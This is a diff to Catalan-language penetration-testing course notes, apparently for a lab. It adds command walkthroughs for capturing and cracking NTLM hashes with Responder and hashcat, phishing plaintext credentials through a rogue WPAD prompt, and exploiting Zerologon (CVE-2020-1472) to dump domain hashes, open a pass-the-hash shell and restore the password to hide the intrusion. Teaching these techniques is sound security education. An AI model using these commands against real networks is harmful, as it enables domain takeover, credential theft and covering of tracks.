@@ -1173,14 +1173,18 @@ armitage</pre>
       és obtindre accés no autoritzat a sistemes o recursos als quals l'atacant no té permís directe.</p>
     <p>Es pot fer una demostració des d'una maquina kali, amb l'eina <code>responder</code></p>
     <pre>$ sudo responder -I eth0</pre>
-    <p>Es posa en marxa la ferramenta i des d'un client s'intenta accedir a un recurs compartit, per exemple, una carpeta</p>
-    <p>Al cap d'una estona, <code>responder</code> captura un HASH</p>
+    <img src="imgs/responder02.png" alt="responder2" width="55%" class="imatge-dreta">
+    <p>Es posa en marxa la ferramenta. Quan des d'un client s'intenta accedir a un recurs compartit, per exemple, una carpeta, al cap d'una estona, <code>responder</code> captura un HASH</p>
+
     <p>La ferramenta <strong>responder</strong> es pot usar conjuntament amb la ferramenta <strong>ntlmrelayx.py</strong> inclosa en la llibreria <strong>impacket</strong></p>
     <p>Els hash <strong>Net-NTLM o Net-NTLMv2</strong> s'han de crackejar posteriorment amb eines com <strong>john o hashcat</strong></p>
     <pre># En haschcat el mode 5600 és l'indicat per a hash de tipus Net-NTLMv2
 hashcat -m 5600 net-ntlmhash.txt password-dic-txt --force</pre>
     <p> ** Una altra opció es utilitzar <code>responder</code> com a un servidor WPAD i forçar l'autenticació bàsica d'usuaris per obtenir les credencials en text pla</p>
     <pre>sudo responder -I eth0 -wFb</pre>
+    <img src="imgs/responder03.png" alt="responder3" width="35%" class="imatge-dreta">
+    <p>Quan des de l'equip client, des del navegador, s'intenta obrir una pàgina que no te en cau/dns, s'obri un quadre que demana credencials. Si l'usuari de l'equip
+      client "pica" i escriu les credencials, estes son capturades per responder i mostrades en text pla !!   </p>
 
     <h2>Password spraying</h2>
      <p>Una vegada es tenen unes credencials, es pot fer un <code><strong>password spraying</strong></code>. Consistix en probar si amb una contrasenya es possible logejar
@@ -1255,7 +1259,8 @@ curl http://ip:puerto/recurs -o fitxer
     <p>Afecta a Windows Server 2008R2, 2021 2012R2, 2016 i 2019, concretament a la implementació en la criptografia del protocol
       <strong>Netlogon Remote Protocol</strong>      </p>
     <h3>Comprovar vulnerabilitat</h3>
-    <pre># clonar en /opt
+    <pre># Canviar a su  ➜   sudo su
+# clonar en /opt   ➜    cd /opt
 git clone https://github.com/SecuraBV/CVE-2020-1472.git</pre>
 <pre># dins de /opt/CVE-2020-1472  , instal·lar dependències
 cd CVE-2020-1472
@@ -1263,9 +1268,12 @@ python3 -m venv .venv
 source .venv/bin/activate  
 python3 -m pip install -r requeriments.txt  </pre>
 <pre># provar vulnerabilitat
-python3 zerologon_tester.py   </pre>
+python3 zerologon_tester.py &LT;netbios-computer-name> &LT;IP> 
+python3 zerologon_tester.py VAGRANT-2008R2 10.0.2.10  </pre>
     <h3>Explotació de la vulnerabilitat</h3>
-    <pre># clonar en /opt
+    <pre># desactivar entorn virtual
+      # canviar nom de la carpeta CVE-2020-1472
+      # clonar en /opt
 git clone https://github.com/dirkjanm/CVE-2020-1472.git</pre>
 <pre># dins de /opt/CVE-2020-1472  , instal·lar dependències
 cd CVE-2020-1472
@@ -1275,7 +1283,11 @@ pip install impacket  </pre>
 <pre># modifica la contrasenya a blanc (sense contrasenya)
 CVE-2020-1472-exploit.py
 # recupera la bbdd de hash 
-secretsdump.py 
+secretsdump.py -no-pass DOMAIN/DC_NETBIOS_NAME$@DC_IP
+# Una vegada amb els hash , es podran usar per obrir una shell
+python3 psexe.py -hashes abcdef12342342341234123:BCDFAA123412343545454667667 administrator@10.0.2.10
+
+# Acabada la fase de intrusió, hem de 'netejar'...
 # torna a posar la contrasenya inicial (per borrar pistes d'intrussió)
 restorepassword.py  
 </pre>
@@ -1283,7 +1295,7 @@ restorepassword.py
     <pre># clonar en /opt
 git clone https://github.com/risksense/zerologon.git</pre>
 <pre>#
-python3 reinstall_original_pw.py   </pre>
+python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP abcdef12342342341234123:BCDFAA123412343545454667667  </pre>
 
 
 
